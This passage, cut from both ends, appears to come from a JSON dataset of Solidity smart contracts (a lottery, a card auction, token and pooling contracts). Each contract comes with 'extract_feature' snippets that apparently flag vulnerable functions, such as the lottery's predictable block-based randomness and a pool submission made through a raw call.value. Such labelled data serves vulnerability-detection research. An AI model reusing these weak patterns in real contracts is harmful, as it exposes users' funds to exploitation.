ERC20(tokenAddr);\n uint amount = d.token.balanceOf(this).sub(d.balanceRemaining);\n require (amount > 0);\n if (feePct > 0) {\n require (d.token.transfer(owner,_applyPct(amount,feePct)));\n }\n amount = d.token.balanceOf(this).sub(d.balanceRemaining);\n d.balanceRemaining = d.token.balanceOf(this);\n d.pct.push(_toPct(amount,finalBalance));\n }\n function tokenFallback (address from, uint value, bytes data) public {\n ERC223Received (from, value);\n }\n}",
  "extract_feature": [
    "function setReceiverAddress (address addr) public onlyOwner {\nrequire (contractStage == 1);\nreceiverAddress = addr;\naddressChangeBlock = block.number;\nReceiverAddressSet(addr);\n}",
    "function submitPool (uint amountInWei) public onlyOwner noReentrancy {\nrequire (contractStage == 1);\nrequire (receiverAddress != 0x00);\nrequire (block.number >= addressChangeBlock.add(6000));\nif (amountInWei == 0) amountInWei = this.balance;\nrequire (contributionMin <= amountInWei && amountInWei <= this.balance);\nfinalBalance = this.balance;\nrequire (receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());\nif (this.balance > 0) ethRefundAmount.push(this.balance);\ncontractStage = 2;\nPoolSubmitted(receiverAddress, amountInWei);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b71"
  },
  "filename": "3146.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract VfSE_Lottery is Ownable {\n using SafeMath for uint256;\n address[] private players;\n address[] public winners;\n uint256[] public payments;\n uint256 private feeValue;\n address public lastWinner;\n address public authorizedToDraw;\n address[] private last10Winners = [0,0,0,0,0,0,0,0,0,0];\n uint256 public lastPayOut;\n uint256 public amountRised;\n address public house;\n uint256 public round;\n uint256 public playValue;\n uint256 public roundEnds;\n uint256 public roundDuration = 1 days;\n bool public stopped;\n address public SecondAddressBalance = 0xFBb1b73C4f0BDa4f67dcA266ce6Ef42f520fBB98;\n address public ThirdAddressBalance = 0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE;\n address public FourthAddressBalance = 0x267be1C1D684F78cb4F6a176C4911b741E4Ffdc0;\n mapping (address => uint256) public payOuts;\n uint256 private _seed;\n function bitSlice(uint256 n, uint256 bits, uint256 slot) private pure returns(uint256) {\n uint256 offset = slot * bits;\n uint256 mask = uint256((2**bits) - 1) << offset;\n return uint256((n & mask) >> offset);\n }\n function maxRandom() private returns (uint256 randomNumber) {\n _seed = uint256(keccak256(_seed, blockhash(block.number - 1), block.coinbase, block.difficulty, blockhash(1), FourthAddressBalance.balance, SecondAddressBalance.balance, ThirdAddressBalance.balance));\n return _seed;\n }\n function random(uint256 upper) private returns (uint256 randomNumber) {\n return maxRandom() % upper;\n }\n function setHouseAddress(address _house) onlyOwner public {\n house = _house;\n }\n function setSecondAddressBalance(address _SecondAddressBalance) onlyOwner public {\n SecondAddressBalance = _SecondAddressBalance;\n }\n function setThirdAddressBalance(address _ThirdAddressBalance) onlyOwner public {\n ThirdAddressBalance = _ThirdAddressBalance;\n }\n function setFourthAddressBalance(address _FourthAddressBalance) onlyOwner public {\n FourthAddressBalance = _FourthAddressBalance;\n }\n function setAuthorizedToDraw(address _authorized) onlyOwner public {\n authorizedToDraw = _authorized;\n }\n function setFee(uint256 _fee) onlyOwner public {\n feeValue = _fee;\n }\n function setPlayValue(uint256 _amount) onlyOwner public {\n playValue = _amount;\n }\n function stopLottery(bool _stop) onlyOwner public {\n stopped = _stop;\n }\n function produceRandom(uint256 upper) private returns (uint256) {\n uint256 rand = random(upper);\n return rand;\n }\n function getPayOutAmount() private view returns (uint256) {\n uint256 fee = amountRised.mul(feeValue).div(100);\n return (amountRised - fee);\n }\n function draw() private {\n require(now > roundEnds);\n uint256 howMuchBets = players.length;\n uint256 k;\n lastWinner = players[produceRandom(howMuchBets)];\n lastPayOut = getPayOutAmount();\n winners.push(lastWinner);\n if (winners.length > 9) {\n for (uint256 i = (winners.length - 10); i < winners.length; i++) {\n last10Winners[k] = winners[i];\n k += 1;\n }\n }\n payments.push(lastPayOut);\n payOuts[lastWinner] += lastPayOut;\n lastWinner.transfer(lastPayOut);\n players.length = 0;\n round += 1;\n amountRised = 0;\n roundEnds = now + roundDuration;\n emit NewWinner(lastWinner, lastPayOut);\n }\n function drawNow() public {\n require(authorizedToDraw == msg.sender);\n draw();\n }\n function play() payable public {\n require (msg.value == playValue);\n require (!stopped);\n if (now > roundEnds) {\n if (players.length < 2) {\n roundEnds = now + roundDuration;\n } else {\n draw();\n }\n }\n players.push(msg.sender);\n amountRised = amountRised.add(msg.value);\n }\n function() payable public {\n play();\n }\n constructor() public {\n house = msg.sender;\n authorizedToDraw = msg.sender;\n feeValue = 10;\n playValue = 100 finney;\n }\n function getBalance() onlyOwner public {\n uint256 thisBalance = address(this).balance;\n house.transfer(thisBalance);\n }\n function getPlayersCount() public view returns (uint256) {\n return players.length;\n }\n function getWinnerCount() public view returns (uint256) {\n return winners.length;\n }\n function getPlayers() public view returns (address[]) {\n return players;\n }\n function getSecondAddressBalance() public view returns (uint256) {\n return SecondAddressBalance.balance;\n }\n function getThirdAddressBalance() public view returns (uint256) {\n return ThirdAddressBalance.balance;\n }\n function getFourthAddressBalance() public view returns (uint256) {\n return FourthAddressBalance.balance;\n }\n function last10() public view returns (address[]) {\n if (winners.length < 11) {\n return winners;\n } else {\n return last10Winners;\n }\n }\n event NewWinner(address _winner, uint256 _amount);\n}",
  "extract_feature": [
    "function maxRandom() private returns (uint256 randomNumber) {\n_seed = uint256(keccak256(_seed, blockhash(block.number - 1), block.coinbase, block.difficulty, blockhash(1), FourthAddressBalance.balance, SecondAddressBalance.balance, ThirdAddressBalance.balance));\nreturn _seed;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b72"
  },
  "filename": "3201.sol",
  "content": "pragma solidity 0.4.24;\ncontract Governable {\n event Pause();\n event Unpause();\n address public governor;\n bool public paused = false;\n constructor() public {\n governor = msg.sender;\n }\n function setGovernor(address _gov) public onlyGovernor {\n governor = _gov;\n }\n modifier onlyGovernor {\n require(msg.sender == governor);\n _;\n }\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyGovernor whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyGovernor whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract CardBase is Governable {\n struct Card {\n uint16 proto;\n uint16 purity;\n }\n function getCard(uint id) public view returns (uint16 proto, uint16 purity) {\n Card memory card = cards[id];\n return (card.proto, card.purity);\n }\n function getShine(uint16 purity) public pure returns (uint8) {\n return uint8(purity / 1000);\n }\n Card[] public cards;\n}\ncontract CardProto is CardBase {\n event NewProtoCard(\n uint16 id, uint8 season, uint8 god,\n Rarity rarity, uint8 mana, uint8 attack,\n uint8 health, uint8 cardType, uint8 tribe, bool packable\n );\n struct Limit {\n uint64 limit;\n bool exists;\n }\n mapping(uint16 => Limit) public limits;\n function setLimit(uint16 id, uint64 limit) public onlyGovernor {\n Limit memory l = limits[id];\n require(!l.exists);\n limits[id] = Limit({\n limit: limit,\n exists: true\n });\n }\n function getLimit(uint16 id) public view returns (uint64 limit, bool set) {\n Limit memory l = limits[id];\n return (l.limit, l.exists);\n }\n mapping(uint8 => bool) public seasonTradable;\n mapping(uint8 => bool) public seasonTradabilityLocked;\n uint8 public currentSeason;\n function makeTradable(uint8 season) public onlyGovernor {\n seasonTradable[season] = true;\n }\n function makeUntradable(uint8 season) public onlyGovernor {\n require(!seasonTradabilityLocked[season]);\n seasonTradable[season] = false;\n }\n function makePermanantlyTradable(uint8 season) public onlyGovernor {\n require(seasonTradable[season]);\n seasonTradabilityLocked[season] = true;\n }\n function isTradable(uint16 proto) public view returns (bool) {\n return seasonTradable[protos[proto].season];\n }\n function nextSeason() public onlyGovernor {\n require(currentSeason <= 255);\n currentSeason++;\n mythic.length = 0;\n legendary.length = 0;\n epic.length = 0;\n rare.length = 0;\n common.length = 0;\n }\n enum Rarity {\n Common,\n Rare,\n Epic,\n Legendary,\n Mythic\n }\n uint8 constant SPELL = 1;\n uint8 constant MINION = 2;\n uint8 constant WEAPON = 3;\n uint8 constant HERO = 4;\n struct ProtoCard {\n bool exists;\n uint8 god;\n uint8 season;\n uint8 cardType;\n Rarity rarity;\n uint8 mana;\n uint8 attack;\n uint8 health;\n uint8 tribe;\n }\n uint16 public protoCount;\n mapping(uint16 => ProtoCard) protos;\n uint16[] public mythic;\n uint16[] public legendary;\n uint16[] public epic;\n uint16[] public rare;\n uint16[] public common;\n function addProtos(\n uint16[] externalIDs, uint8[] gods, Rarity[] rarities, uint8[] manas, uint8[] attacks,\n uint8[] healths, uint8[] cardTypes, uint8[] tribes, bool[] packable\n ) public onlyGovernor returns(uint16) {\n for (uint i = 0; i < externalIDs.length; i++) {\n ProtoCard memory card = ProtoCard({\n exists: true,\n god: gods[i],\n season: currentSeason,\n cardType: cardTypes[i],\n rarity: rarities[i],\n mana: manas[i],\n attack: attacks[i],\n health: healths[i],\n tribe: tribes[i]\n });\n _addProto(externalIDs[i], card, packable[i]);\n }\n }\n function addProto(\n uint16 externalID, uint8 god, Rarity rarity, uint8 mana, uint8 attack, uint8 health, uint8 cardType, uint8 tribe, bool packable\n ) public onlyGovernor returns(uint16) {\n ProtoCard memory card = ProtoCard({\n exists: true,\n god: god,\n season: currentSeason,\n cardType: cardType,\n rarity: rarity,\n mana: mana,\n attack: attack,\n health: health,\n tribe: tribe\n });\n _addProto(externalID, card, packable);\n }\n function addWeapon(\n uint16 externalID, uint8 god, Rarity rarity, uint8 mana, uint8 attack, uint8 durability, bool packable\n ) public onlyGovernor returns(uint16) {\n ProtoCard memory card = ProtoCard({\n exists: true,\n god: god,\n season: currentSeason,\n cardType: WEAPON,\n rarity: rarity,\n mana: mana,\n attack: attack,\n health: durability,\n tribe: 0\n });\n _addProto(externalID, card, packable);\n }\n function addSpell(uint16 externalID, uint8 god, Rarity rarity, uint8 mana, bool packable) public onlyGovernor returns(uint16) {\n ProtoCard memory card = ProtoCard({\n exists: true,\n god: god,\n season: currentSeason,\n cardType: SPELL,\n rarity: rarity,\n mana: mana,\n attack: 0,\n health: 0,\n tribe: 0\n });\n _addProto(externalID, card, packable);\n }\n function addMinion(\n uint16 externalID, uint8 god, Rarity rarity, uint8 mana, uint8 attack, uint8 health, uint8 tribe, bool packable\n ) public onlyGovernor returns(uint16) {\n ProtoCard memory card = ProtoCard({\n exists: true,\n god: god,\n season: currentSeason,\n cardType: MINION,\n rarity: rarity,\n mana: mana,\n attack: attack,\n health: health,\n tribe: tribe\n });\n _addProto(externalID, card, packable);\n }\n function _addProto(uint16 externalID, ProtoCard memory card, bool packable) internal {\n require(!protos[externalID].exists);\n card.exists = true;\n protos[externalID] = card;\n protoCount++;\n emit NewProtoCard(\n externalID, currentSeason, card.god,\n card.rarity, card.mana, card.attack,\n card.health, card.cardType, card.tribe, packable\n );\n if (packable) {\n Rarity rarity = card.rarity;\n if (rarity == Rarity.Common) {\n common.push(externalID);\n } else if (rarity == Rarity.Rare) {\n rare.push(externalID);\n } else if (rarity == Rarity.Epic) {\n epic.push(externalID);\n } else if (rarity == Rarity.Legendary) {\n legendary.push(externalID);\n } else if (rarity == Rarity.Mythic) {\n mythic.push(externalID);\n } else {\n require(false);\n }\n }\n }\n function getProto(uint16 id) public view returns(\n bool exists, uint8 god, uint8 season, uint8 cardType, Rarity rarity, uint8 mana, uint8 attack, uint8 health, uint8 tribe\n ) {\n ProtoCard memory proto = protos[id];\n return (\n proto.exists,\n proto.god,\n proto.season,\n proto.cardType,\n proto.rarity,\n proto.mana,\n proto.attack,\n proto.health,\n proto.tribe\n );\n }\n function getRandomCard(Rarity rarity, uint16 random) public view returns (uint16) {\n if (rarity == Rarity.Common) {\n return common[random % common.length];\n } else if (rarity == Rarity.Rare) {\n return rare[random % rare.length];\n } else if (rarity == Rarity.Epic) {\n return epic[random % epic.length];\n } else if (rarity == Rarity.Legendary) {\n return legendary[random % legendary.length];\n } else if (rarity == Rarity.Mythic) {\n uint16 id;\n uint64 limit;\n bool set;\n for (uint i = 0; i < mythic.length; i++) {\n id = mythic[(random + i) % mythic.length];\n (limit, set) = getLimit(id);\n if (set && limit > 0){\n return id;\n }\n }\n return legendary[random % legendary.length];\n }\n require(false);\n return 0;\n }\n function replaceProto(\n uint16 index, uint8 god, uint8 cardType, uint8 mana, uint8 attack, uint8 health, uint8 tribe\n ) public onlyGovernor {\n ProtoCard memory pc = protos[index];\n require(!seasonTradable[pc.season]);\n protos[index] = ProtoCard({\n exists: true,\n god: god,\n season: pc.season,\n cardType: cardType,\n rarity: pc.rarity,\n mana: mana,\n attack: attack,\n health: health,\n tribe: tribe\n });\n }\n}\ncontract MigrationInterface {\n function createCard(address user, uint16 proto, uint16 purity) public returns (uint);\n function getRandomCard(CardProto.Rarity rarity, uint16 random) public view returns (uint16);\n function migrate(uint id) public;\n}\ncontract CardPackFour {\n MigrationInterface public migration;\n uint public creationBlock;\n constructor(MigrationInterface _core) public payable {\n migration = _core;\n creationBlock = 5939061 + 2000;\n }\n event Referral(address indexed referrer, uint value, address purchaser);\n function purchase(uint16 packCount, address referrer) public payable;\n function _getPurity(uint16 randOne, uint16 randTwo) internal pure returns (uint16) {\n if (randOne >= 998) {\n return 3000 + randTwo;\n } else if (randOne >= 988) {\n return 2000 + randTwo;\n } else if (randOne >= 938) {\n return 1000 + randTwo;\n } else {\n return randTwo;\n }\n }\n}\ncontract Ownable {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n function setOwner(address _owner) public onlyOwner {\n owner = _owner;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary SafeMath64 {\n function mul(uint64 a, uint64 b) internal pure returns (uint64 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint64 a, uint64 b) internal pure returns (uint64) {\n return a / b;\n }\n function sub(uint64 a, uint64 b) internal pure returns (uint64) {\n assert(b <= a);\n return a - b;\n }\n function add(uint64 a, uint64 b) internal pure returns (uint64 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract AuctionPack is CardPackFour, Pausable {\n using SafeMath for uint;\n using SafeMath64 for uint64;\n mapping(address => uint) owed;\n event Created(uint indexed id, uint16 proto, uint16 purity, uint minBid, uint length);\n event Opened(uint indexed id, uint64 start);\n event Extended(uint indexed id, uint64 length);\n event Bid(uint indexed id, address indexed bidder, uint value);\n event Claimed(uint indexed id, uint indexed cardID, address indexed bidder, uint value, uint16 proto, uint16 purity);\n event Bonus(uint indexed id, uint indexed cardID, address indexed bidder, uint16 proto, uint16 purity);\n enum Status {\n Closed,\n Open,\n Claimed\n }\n struct Auction {\n Status status;\n uint16 proto;\n uint16 purity;\n uint highestBid;\n address highestBidder;\n uint64 start;\n uint64 length;\n address beneficiary;\n uint16 bonusProto;\n uint16 bonusPurity;\n uint64 bufferPeriod;\n uint minIncreasePercent;\n }\n Auction[] auctions;\n constructor(MigrationInterface _migration) public CardPackFour(_migration) {\n }\n function getAuction(uint id) public view returns (\n Status status,\n uint16 proto,\n uint16 purity,\n uint highestBid,\n address highestBidder,\n uint64 start,\n uint64 length,\n uint16 bonusProto,\n uint16 bonusPurity,\n uint64 bufferPeriod,\n uint minIncreasePercent,\n address beneficiary\n ) {\n require(auctions.length > id);\n Auction memory a = auctions[id];\n return (\n a.status, a.proto, a.purity, a.highestBid,\n a.highestBidder, a.start, a.length, a.bonusProto,\n a.bonusPurity, a.bufferPeriod, a.minIncreasePercent, a.beneficiary\n );\n }\n function createAuction(\n address beneficiary, uint16 proto, uint16 purity,\n uint minBid, uint64 length, uint16 bonusProto, uint16 bonusPurity,\n uint64 bufferPeriod, uint minIncrease\n ) public onlyOwner whenNotPaused returns (uint) {\n require(beneficiary != address(0));\n require(minBid >= 100 wei);\n Auction memory auction = Auction({\n status: Status.Closed,\n proto: proto,\n purity: purity,\n highestBid: minBid,\n highestBidder: address(0),\n start: 0,\n length: length,\n beneficiary: beneficiary,\n bonusProto: bonusProto,\n bonusPurity: bonusPurity,\n bufferPeriod: bufferPeriod,\n minIncreasePercent: minIncrease\n });\n uint id = auctions.push(auction) - 1;\n emit Created(id, proto, purity, minBid, length);\n return id;\n }\n function openAuction(uint id) public onlyOwner {\n Auction storage auction = auctions[id];\n require(auction.status == Status.Closed);\n auction.status = Status.Open;\n auction.start = uint64(block.number);\n emit Opened(id, auction.start);\n }\n function purchase(uint16, address) public payable {\n }\n function getMinBid(uint id) public view returns (uint) {\n Auction memory auction = auctions[id];\n uint highest = auction.highestBid;\n uint numerator = highest.div(100);\n uint minIncrease = numerator.mul(auction.minIncreasePercent);\n uint threshold = highest + minIncrease;\n return threshold;\n }\n function bid(uint id) public payable {\n Auction storage auction = auctions[id];\n require(auction.status == Status.Open);\n uint64 end = auction.start.add(auction.length);\n require(end >= block.number);\n uint threshold = getMinBid(id);\n require(msg.value >= threshold);\n uint64 differenceToEnd = end.sub(uint64(block.number));\n if (auction.bufferPeriod > differenceToEnd) {\n uint64 toAdd = auction.bufferPeriod.sub(differenceToEnd);\n auction.length = auction.length.add(toAdd);\n emit Extended(id, auction.length);\n }\n emit Bid(id, msg.sender, msg.value);\n if (auction.highestBidder != address(0)) {\n owed[auction.highestBidder] = owed[auction.highestBidder].add(auction.highestBid);\n if (auction.bonusProto != 0) {\n uint cardID = migration.createCard(auction.highestBidder, auction.bonusProto, auction.bonusPurity);\n emit Bonus(id, cardID, auction.highestBidder, auction.bonusProto, auction.bonusPurity);\n }\n }\n auction.highestBid = msg.value;\n auction.highestBidder = msg.sender;\n }\n function claim(uint id) public returns (uint) {\n Auction storage auction = auctions[id];\n uint64 end = auction.start.add(auction.length);\n require(block.number > end);\n require(auction.status == Status.Open);\n auction.status = Status.Claimed;\n uint cardID = migration.createCard(auction.highestBidder, auction.proto, auction.purity);\n emit Claimed(id, cardID, auction.highestBidder, auction.highestBid, auction.proto, auction.purity);\n owed[auction.beneficiary] = owed[auction.beneficiary].add(auction.highestBid);\n return cardID;\n }\n function withdraw(address user) public {\n uint balance = owed[user];\n require(balance > 0);\n owed[user] = 0;\n user.transfer(balance);\n }\n function getOwed(address user) public view returns (uint) {\n return owed[user];\n }\n}",
  "extract_feature": [
    "function openAuction(uint id) public onlyOwner {\nAuction storage auction = auctions[id];\nrequire(auction.status == Status.Closed);\nauction.status = Status.Open;\nauction.start = uint64(block.number);\nemit Opened(id, auction.start);\n}",
    "function bid(uint id) public payable {\nAuction storage auction = auctions[id];\nrequire(auction.status == Status.Open);\nuint64 end = auction.start.add(auction.length);\nrequire(end >= block.number);\nuint threshold = getMinBid(id);\nrequire(msg.value >= threshold);\nuint64 differenceToEnd = end.sub(uint64(block.number));\nif (auction.bufferPeriod > differenceToEnd) {\nuint64 toAdd = auction.bufferPeriod.sub(differenceToEnd);\nauction.length = auction.length.add(toAdd);\nemit Extended(id, auction.length);\n}\nemit Bid(id, msg.sender, msg.value);\nif (auction.highestBidder != address(0)) {\nowed[auction.highestBidder] = owed[auction.highestBidder].add(auction.highestBid);\nif (auction.bonusProto != 0) {\nuint cardID = migration.createCard(auction.highestBidder, auction.bonusProto, auction.bonusPurity);\nemit Bonus(id, cardID, auction.highestBidder, auction.bonusProto, auction.bonusPurity);\n}\n}\nauction.highestBid = msg.value;\nauction.highestBidder = msg.sender;\n}",
    "function claim(uint id) public returns (uint) {\nAuction storage auction = auctions[id];\nuint64 end = auction.start.add(auction.length);\nrequire(block.number > end);\nrequire(auction.status == Status.Open);\nauction.status = Status.Claimed;\nuint cardID = migration.createCard(auction.highestBidder, auction.proto, auction.purity);\nemit Claimed(id, cardID, auction.highestBidder, auction.highestBid, auction.proto, auction.purity);\nowed[auction.beneficiary] = owed[auction.beneficiary].add(auction.highestBid);\nreturn cardID;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b73"
  },
  "filename": "3240.sol",
  "content": "pragma solidity ^0.4.23;\ncontract NokuPricingPlan {\n function payFee(bytes32 serviceName, uint256 multiplier, address client) public returns(bool paid);\n function usageFee(bytes32 serviceName, uint256 multiplier) public view returns(uint fee);\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract NokuCustomToken is Ownable {\n event LogBurnFinished();\n event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);\n NokuPricingPlan public pricingPlan;\n address public serviceProvider;\n bool public burningFinished;\n modifier onlyServiceProvider() {\n require(msg.sender == serviceProvider, \"caller is not service provider\");\n _;\n }\n modifier canBurn() {\n require(!burningFinished, \"burning finished\");\n _;\n }\n constructor(address _pricingPlan, address _serviceProvider) internal {\n require(_pricingPlan != 0, \"_pricingPlan is zero\");\n require(_serviceProvider != 0, \"_serviceProvider is zero\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n serviceProvider = _serviceProvider;\n }\n function isCustomToken() public pure returns(bool isCustom) {\n return true;\n }\n function finishBurning() public onlyOwner canBurn returns(bool finished) {\n burningFinished = true;\n emit LogBurnFinished();\n return true;\n }\n function setPricingPlan(address _pricingPlan) public onlyServiceProvider {\n require(_pricingPlan != 0, \"_pricingPlan is 0\");\n require(_pricingPlan != address(pricingPlan), \"_pricingPlan == pricingPlan\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n emit LogPricingPlanChanged(msg.sender, _pricingPlan);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract BurnableERC20 is ERC20 {\n function burn(uint256 amount) public returns (bool burned);\n}\ncontract NokuTokenBurner is Pausable {\n using SafeMath for uint256;\n event LogNokuTokenBurnerCreated(address indexed caller, address indexed wallet);\n event LogBurningPercentageChanged(address indexed caller, uint256 indexed burningPercentage);\n address public wallet;\n uint256 public burningPercentage;\n uint256 public burnedTokens;\n uint256 public transferredTokens;\n constructor(address _wallet) public {\n require(_wallet != address(0), \"_wallet is zero\");\n wallet = _wallet;\n burningPercentage = 100;\n emit LogNokuTokenBurnerCreated(msg.sender, _wallet);\n }\n function setBurningPercentage(uint256 _burningPercentage) public onlyOwner {\n require(0 <= _burningPercentage && _burningPercentage <= 100, \"_burningPercentage not in [0, 100]\");\n require(_burningPercentage != burningPercentage, \"_burningPercentage equal to current one\");\n burningPercentage = _burningPercentage;\n emit LogBurningPercentageChanged(msg.sender, _burningPercentage);\n }\n function tokenReceived(address _token, uint256 _amount) public whenNotPaused {\n require(_token != address(0), \"_token is zero\");\n require(_amount > 0, \"_amount is zero\");\n uint256 amountToBurn = _amount.mul(burningPercentage).div(100);\n if (amountToBurn > 0) {\n assert(BurnableERC20(_token).burn(amountToBurn));\n burnedTokens = burnedTokens.add(amountToBurn);\n }\n uint256 amountToTransfer = _amount.sub(amountToBurn);\n if (amountToTransfer > 0) {\n assert(BurnableERC20(_token).transfer(wallet, amountToTransfer));\n transferredTokens = transferredTokens.add(amountToTransfer);\n }\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract DetailedERC20 is ERC20 {\n string public name;\n string public symbol;\n uint8 public decimals;\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n 